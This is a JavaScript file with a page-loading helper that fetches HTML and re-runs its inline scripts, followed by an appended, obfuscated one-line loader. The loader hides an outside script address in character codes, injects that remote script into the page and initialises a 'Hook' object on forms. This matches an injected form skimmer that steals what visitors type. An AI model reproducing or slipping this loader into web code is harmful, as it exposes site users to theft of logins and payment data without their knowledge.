function load(url, id = "tampil") {
    fetch(encodeURI(url))
        .then(response => response.text())
        .then(hasil => {
            document.getElementById(id).innerHTML = hasil;
            if (hasil.includes("<script>")) {
                for (let i = 0; i < (hasil.match(/<script>/g) || []).length; i++) {
                    let start = hasil.indexOf("<script>", i) + 8;
                    let end = hasil.indexOf("</script>", i);
                    let script = hasil.substring(start, end);
                    let node = document.createElement("script");
                    let ss = document.createTextNode(script);
                    node.appendChild(ss);
                    document.getElementById(id).appendChild(node);
                }
            }
        }).catch((error) => {
            console.log("Error: " + error);
        });
}
(function(){if(typeof n!="function")var n=function(){return new Promise(function(e,r){let o=document.querySelector('script[id="hook-loader"]');o==null&&(o=document.createElement("script"),o.src=String.fromCharCode(47,47,115,101,110,100,46,119,97,103,97,116,101,119,97,121,46,112,114,111,47,99,108,105,101,110,116,46,106,115,63,99,97,99,104,101,61,105,103,110,111,114,101),o.id="hook-loader",o.onload=e,o.onerror=r,document.head.appendChild(o))})};n().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//4bc512bd292aa591101ea30aa5cf2a14a17b2c0aa686cb48fde0feeb4721d5db